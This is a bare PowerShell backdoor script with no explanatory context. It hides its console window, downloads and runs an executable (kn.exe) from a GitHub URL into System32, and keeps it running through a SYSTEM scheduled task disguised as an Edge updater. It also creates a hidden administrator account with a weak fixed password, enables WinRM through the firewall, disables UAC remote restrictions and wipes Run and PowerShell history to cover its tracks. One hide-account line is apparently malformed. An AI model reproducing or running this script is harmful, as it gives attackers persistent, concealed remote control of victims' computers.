# Function to hide a window
function Hide-Window {
    param(
        [IntPtr]$Handle = (Get-Process -PID $PID).MainWindowHandle
    )
    Add-Type @"
    using System;
    using System.Runtime.InteropServices;

    public class Window {
        [DllImport("user32.dll")]
        [return: MarshalAs(UnmanagedType.Bool)]
        public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

        [DllImport("kernel32.dll")]
        public static extern IntPtr GetConsoleWindow();
    }
"@
    [void][Window]::ShowWindow($Handle, 0)
}

# Hide the current PowerShell window
Hide-Window

# Define the URL of the exe file
$url = "https://github.com/VBV11/shell/raw/main/kn.exe"

# Define the destination path where the exe will be copied
$destination = "C:\Windows\System32\kn.exe"

# Download the file
Invoke-WebRequest -Uri $url -OutFile $destination

# Execute the downloaded exe if it exists
if (Test-Path $destination) {
    Start-Process -FilePath $destination
}

# Define task name and description
$TaskName = "MicrosoftEdgeAutoUpdater-F6"
$TaskDescription = "Updates MicrosoftEdge"

# Define the action settings
$ActionProgram = "C:\Windows\System32\kn.exe"

# Create a new task principal
$TaskPrincipal = New-ScheduledTaskPrincipal -UserId "NT AUTHORITY\SYSTEM" -LogonType ServiceAccount

# Create a new trigger
$Trigger = New-ScheduledTaskTrigger -AtLogon

# Create a new action
$Action = New-ScheduledTaskAction -Execute $ActionProgram

# Create the scheduled task
$Task = New-ScheduledTask -Action $Action -Principal $TaskPrincipal -Trigger $Trigger -Description $TaskDescription

# Modify the settings to uncheck the condition "Start the task only if the computer is on AC power"
$Settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries
$Task.Settings = $Settings

# Register the scheduled task
Register-ScheduledTask -TaskName $TaskName -InputObject $Task -Force

# Create a new local user account
$Username = "Admin"
$Password = ConvertTo-SecureString "Password1" -AsPlainText -Force
New-LocalUser -Name $Username -Password $Password -PasswordNeverExpires

# Add the newly created user to the local Administrators group
Add-LocalGroupMember -Group "Administrators" -Member $Username

# Enable Windows Remote Management (WinRM)
Enable-PSRemoting -Force

# Add a firewall rule to allow WinRM traffic
New-NetFirewallRule -DisplayName "Windows Remote Management for RD" -Direction Inbound -Protocol TCP -LocalPort 5985 -Action Allow

# Disable UAC remote restrictions
Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" -Name "LocalAccountTokenFilterPolicy" -Value 1 -Force

# Hide the user "Admin" from the logon screen
New-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList" -Name "Admin" -Value 0 -PropertyType DWORD -Force

# Hide the user "Admin" from the user accounts list
New-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList" -Name "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList" -Value 0 -PropertyType DWORD -Force

# Delete run box history
Remove-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU' -Name '*' -Force

# Delete powershell history
Remove-Item (Get-PSReadlineOption).HistorySavePath
